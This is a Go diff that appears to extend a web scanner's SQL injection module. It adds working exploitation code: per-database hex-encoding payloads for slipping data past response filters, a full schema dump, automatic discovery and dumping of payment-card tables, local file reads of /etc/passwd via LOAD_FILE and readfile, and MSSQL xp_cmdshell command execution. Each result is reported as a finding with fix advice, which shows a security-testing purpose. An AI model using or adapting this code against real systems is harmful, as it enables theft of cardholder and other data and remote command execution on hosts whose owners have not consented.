@@ -6,6 +6,7 @@
 package sqli
 
 import (
+	"encoding/hex"
 	"io"
 	"net/http"
 	"net/http/httputil"
@@ -58,6 +59,14 @@ type dbProfile struct {
 	wrap        func(expr string) string
 	columnsExpr func(table string) string
 	dumpExpr    func(table string, cols []string) string
+
+	// hexExpr wraps a scalar so it returns a hex string, used to exfiltrate
+	// values when the response filters special characters.
+	hexExpr func(expr string) string
+
+	// fileReadExpr returns an expression that reads a local file, when the
+	// DBMS exposes such a function. nil means file read is not attempted.
+	fileReadExpr func(path string) string
 }
 
 var profiles = []dbProfile{
@@ -74,6 +83,8 @@ var profiles = []dbProfile{
 		dumpExpr: func(t string, cols []string) string {
 			return "(SELECT group_concat(concat_ws(0x3a," + strings.Join(cols, ",") + ") SEPARATOR 0x0a) FROM " + t + ")"
 		},
+		hexExpr:      func(e string) string { return "hex((" + e + "))" },
+		fileReadExpr: func(path string) string { return "LOAD_FILE('" + path + "')" },
 	},
 	{
 		name:        "PostgreSQL",
@@ -88,6 +99,7 @@ var profiles = []dbProfile{
 		dumpExpr: func(t string, cols []string) string {
 			return "(SELECT string_agg(concat_ws(':'," + strings.Join(cols, ",") + "),chr(10)) FROM " + t + ")"
 		},
+		hexExpr: func(e string) string { return "encode(convert_to((" + e + ")::text,'UTF8'),'hex')" },
 	},
 	{
 		name:        "MSSQL",
@@ -103,6 +115,7 @@ var profiles = []dbProfile{
 			joined := strings.Join(cols, "+':'+")
 			return "(SELECT STRING_AGG(CONVERT(varchar(max)," + joined + "),CHAR(10)) FROM " + t + ")"
 		},
+		hexExpr: func(e string) string { return "convert(varchar(max),convert(varbinary(max),(" + e + ")),2)" },
 	},
 	{
 		name:        "SQLite",
@@ -115,6 +128,8 @@ var profiles = []dbProfile{
 		dumpExpr: func(t string, cols []string) string {
 			return "(SELECT group_concat(" + strings.Join(cols, "||':'||") + ",char(10)) FROM " + t + ")"
 		},
+		hexExpr:      func(e string) string { return "hex((" + e + "))" },
+		fileReadExpr: func(path string) string { return "readfile('" + path + "')" },
 	},
 }
 
@@ -323,7 +338,217 @@ func extract(cfg *config.Config, client *http.Client, p recon.Param, orig string
 		findings = append(findings, *creds)
 	}
 
+	if schema := dumpSchema(cfg, client, p, orig, c, cols, pos, *profile, tables); schema != nil {
+		findings = append(findings, *schema)
+	}
+
+	if cards := dumpCards(cfg, client, p, orig, c, cols, pos, *profile, tables); cards != nil {
+		findings = append(findings, *cards)
+	}
+
+	if file := readFileSQLi(cfg, client, p, orig, c, cols, pos, *profile); file != nil {
+		findings = append(findings, *file)
+	}
+
+	if cmd := xpCmdshell(cfg, client, p, orig, c, cols, pos, *profile); cmd != nil {
+		findings = append(findings, *cmd)
+	}
+
 	return findings
+}
+
+// maxSchemaTables bounds how many tables are enumerated so a large schema does
+// not blow up the tool's runtime.
+const maxSchemaTables = 15
+
+// dumpSchema enumerates every table with its columns to map the full schema.
+func dumpSchema(cfg *config.Config, client *http.Client, p recon.Param, orig string, c injContext, cols, pos int, profile dbProfile, tables string) *finding.Finding {
+	if profile.columnsExpr == nil {
+		return nil
+	}
+
+	var builder strings.Builder
+	count := 0
+
+	for _, table := range splitList(tables) {
+		if count >= maxSchemaTables {
+			break
+		}
+
+		columns := readValueDeep(cfg, client, p, orig, c, cols, pos, profile, profile.columnsExpr(table))
+		if columns == "" {
+			continue
+		}
+
+		builder.WriteString(table + ": " + columns + "\n")
+		count++
+	}
+
+	if builder.Len() == 0 {
+		return nil
+	}
+
+	return &finding.Finding{
+		Title:       "Database schema enumerated via SQL injection",
+		Module:      "sqli",
+		Severity:    finding.High,
+		OWASP:       "A03:2025 - Injection",
+		CWE:         "CWE-89",
+		CVSS:        8.6,
+		Description: "UNION-based injection listed every table and its columns, revealing the full database schema available to an attacker.",
+		Evidence: finding.Evidence{
+			Extracted: trim(builder.String(), 2000),
+		},
+		NextSteps: []string{
+			"Fix the injection with prepared statements and least-privilege DB accounts.",
+			"Review which tables hold sensitive data and tighten access.",
+		},
+	}
+}
+
+// dumpCards extracts a payment-card table in full when one exists.
+func dumpCards(cfg *config.Config, client *http.Client, p recon.Param, orig string, c injContext, cols, pos int, profile dbProfile, tables string) *finding.Finding {
+	table := pickCardTable(tables)
+	if table == "" || profile.columnsExpr == nil {
+		return nil
+	}
+
+	columns := splitList(readValueDeep(cfg, client, p, orig, c, cols, pos, profile, profile.columnsExpr(table)))
+	if len(columns) == 0 {
+		return nil
+	}
+
+	if len(columns) > 8 {
+		columns = columns[:8]
+	}
+
+	dumpExpr := profile.dumpExpr(table, columns)
+
+	dumped := readValueDeep(cfg, client, p, orig, c, cols, pos, profile, dumpExpr)
+	if dumped == "" {
+		return nil
+	}
+
+	return &finding.Finding{
+		Title:       "Payment card data extracted from table '" + table + "' via SQL injection",
+		Module:      "sqli",
+		Severity:    finding.Critical,
+		OWASP:       "A03:2025 - Injection",
+		CWE:         "CWE-89",
+		CVSS:        9.8,
+		Description: "UNION-based injection dumped a payment-card table (" + strings.Join(columns, ",") + "), exposing cardholder data.",
+		Evidence: finding.Evidence{
+			Extracted: trim(dumped, 2000),
+		},
+		NextSteps: []string{
+			"Treat this as a payment-data breach and follow PCI-DSS incident response.",
+			"Never store CVV; tokenize card numbers and fix the injection.",
+		},
+	}
+}
+
+// readFileSQLi reads /etc/passwd through the DBMS file-read primitive when one
+// is available (MySQL LOAD_FILE, SQLite readfile).
+func readFileSQLi(cfg *config.Config, client *http.Client, p recon.Param, orig string, c injContext, cols, pos int, profile dbProfile) *finding.Finding {
+	if profile.fileReadExpr == nil {
+		return nil
+	}
+
+	content := readValueDeep(cfg, client, p, orig, c, cols, pos, profile, profile.fileReadExpr("/etc/passwd"))
+	if !regexp.MustCompile(`root:.*:0:0:`).MatchString(content) {
+		return nil
+	}
+
+	return &finding.Finding{
+		Title:       "Local file read via SQL injection",
+		Module:      "sqli",
+		Severity:    finding.Critical,
+		OWASP:       "A03:2025 - Injection",
+		CWE:         "CWE-89",
+		CVSS:        9.1,
+		Description: "The database account can read local files through SQL injection, returning the contents of /etc/passwd.",
+		Evidence: finding.Evidence{
+			Extracted: trim(content, 2000),
+		},
+		NextSteps: []string{
+			"Remove FILE privilege from the application database account.",
+			"Fix the injection with prepared statements.",
+		},
+	}
+}
+
+// xpCmdshell attempts MSSQL command execution. It only reports when real command
+// output is reflected, so it never produces a false positive on hardened hosts.
+func xpCmdshell(cfg *config.Config, client *http.Client, p recon.Param, orig string, c injContext, cols, pos int, profile dbProfile) *finding.Finding {
+	if profile.name != "MSSQL" {
+		return nil
+	}
+
+	payload := orig + "'; EXEC xp_cmdshell 'whoami'-- -"
+
+	resp := request(cfg, client, p, payload)
+	if resp == nil {
+		return nil
+	}
+
+	output := regexp.MustCompile(`[A-Za-z0-9.\-]+\\[A-Za-z0-9.$\-]+`).FindString(resp.body)
+	if output == "" {
+		return nil
+	}
+
+	return &finding.Finding{
+		Title:       "OS command execution via MSSQL xp_cmdshell",
+		Module:      "sqli",
+		Severity:    finding.Critical,
+		OWASP:       "A03:2025 - Injection",
+		CWE:         "CWE-89",
+		CVSS:        9.8,
+		Description: "Stacked SQL injection executed xp_cmdshell and returned command output, confirming remote command execution through the database.",
+		Evidence: finding.Evidence{
+			Request:   resp.dump,
+			Response:  trim(resp.body, 400),
+			Extracted: "whoami: " + output,
+		},
+		NextSteps: []string{
+			"Disable xp_cmdshell and run SQL Server under a low-privilege account.",
+			"Fix the injection with prepared statements.",
+		},
+	}
+}
+
+func pickCardTable(tables string) string {
+	for _, t := range splitList(tables) {
+		l := strings.ToLower(t)
+		if strings.Contains(l, "card") || strings.Contains(l, "payment") || strings.Contains(l, "credit") {
+			return t
+		}
+	}
+
+	return ""
+}
+
+// readValueDeep reads a scalar, falling back to a hex-encoded read when the
+// plain read comes back empty (the response filtered special characters).
+func readValueDeep(cfg *config.Config, client *http.Client, p recon.Param, orig string, c injContext, cols, pos int, profile dbProfile, expr string) string {
+	if value := readValue(cfg, client, p, orig, c, cols, pos, profile, expr); value != "" {
+		return value
+	}
+
+	if profile.hexExpr == nil {
+		return ""
+	}
+
+	encoded := readValue(cfg, client, p, orig, c, cols, pos, profile, profile.hexExpr(expr))
+	if encoded == "" {
+		return ""
+	}
+
+	decoded, err := hex.DecodeString(strings.TrimSpace(encoded))
+	if err != nil {
+		return ""
+	}
+
+	return string(decoded)
 }
 
 // columnCount finds the number of columns and a position that reflects in the
